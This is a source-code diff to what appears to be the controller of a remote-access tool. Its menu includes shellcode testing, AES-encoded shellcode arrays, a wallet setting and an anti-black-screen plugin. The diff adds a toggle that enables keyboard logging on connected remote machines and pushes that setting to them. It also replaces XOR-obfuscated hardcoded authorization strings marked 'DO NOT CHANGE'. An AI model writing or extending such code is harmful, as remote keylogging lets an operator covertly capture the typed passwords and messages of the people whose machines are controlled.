@@ -534,6 +534,7 @@ BEGIN_MESSAGE_MAP(CMy2015RemoteDlg, CDialogEx)
     ON_COMMAND(ID_SHELLCODE_TEST_AES_BIN, &CMy2015RemoteDlg::OnShellcodeTestAesBin)
         ON_COMMAND(ID_TOOL_RELOAD_PLUGINS, &CMy2015RemoteDlg::OnToolReloadPlugins)
         ON_COMMAND(ID_SHELLCODE_AES_C_ARRAY, &CMy2015RemoteDlg::OnShellcodeAesCArray)
+        ON_COMMAND(ID_PARAM_KBLOGGER, &CMy2015RemoteDlg::OnParamKblogger)
         END_MESSAGE_MAP()
 
 
@@ -1058,8 +1059,9 @@ BOOL CMy2015RemoteDlg::OnInitDialog()
     const Validation* v = GetValidation();
     if (!(strlen(v->Admin) && v->Port > 0)) {
         // IMPORTANT: For authorization only.
+        // NO NOT CHANGE: The program may not work if following code changed.
         PrintableXORCipher cipher;
-        char buf1[] = { "ld{ll{dc`{geb" }, buf2[] = {"b`af"};
+        char buf1[] = { "? &!x1:x<!{<6 " }, buf2[] = { 'a','a','f',0 };
         cipher.process(buf1, strlen(buf1));
         cipher.process(buf2, strlen(buf2));
         static Validation test(99999, buf1, atoi(buf2));
@@ -1122,6 +1124,9 @@ BOOL CMy2015RemoteDlg::OnInitDialog()
     m_settings = { m, sizeof(void*) == 8, __DATE__, n, usingFRP };
     auto w = THIS_CFG.GetStr("settings", "wallet", "");
     memcpy(m_settings.WalletAddress, w.c_str(), w.length());
+    m_settings.EnableKBLogger = THIS_CFG.GetInt("settings", "KeyboardLog", 0);
+	CMenu* SubMenu = m_MainMenu.GetSubMenu(2);
+    SubMenu->CheckMenuItem(ID_PARAM_KBLOGGER, m_settings.EnableKBLogger ? MF_CHECKED : MF_UNCHECKED);
     std::map<int, std::string> myMap = {{SOFTWARE_CAMERA, "摄像头"}, {SOFTWARE_TELEGRAM, "电报" }};
     std::string str = myMap[n];
     LVCOLUMN lvColumn;
@@ -3912,4 +3917,14 @@ LRESULT CMy2015RemoteDlg::AntiBlackScreen(WPARAM wParam, LPARAM lParam) {
     }else
         MessageBoxA(CString("没有反黑屏插件: ") + path.c_str(), "提示", MB_ICONINFORMATION);
     return S_OK;
+}
+
+
+void CMy2015RemoteDlg::OnParamKblogger()
+{
+    m_settings.EnableKBLogger = !m_settings.EnableKBLogger;
+	CMenu* SubMenu = m_MainMenu.GetSubMenu(2);
+	SubMenu->CheckMenuItem(ID_PARAM_KBLOGGER, m_settings.EnableKBLogger ? MF_CHECKED : MF_UNCHECKED);
+    THIS_CFG.SetInt("settings", "KeyboardLog", m_settings.EnableKBLogger);
+    SendMasterSettings(nullptr);
 }
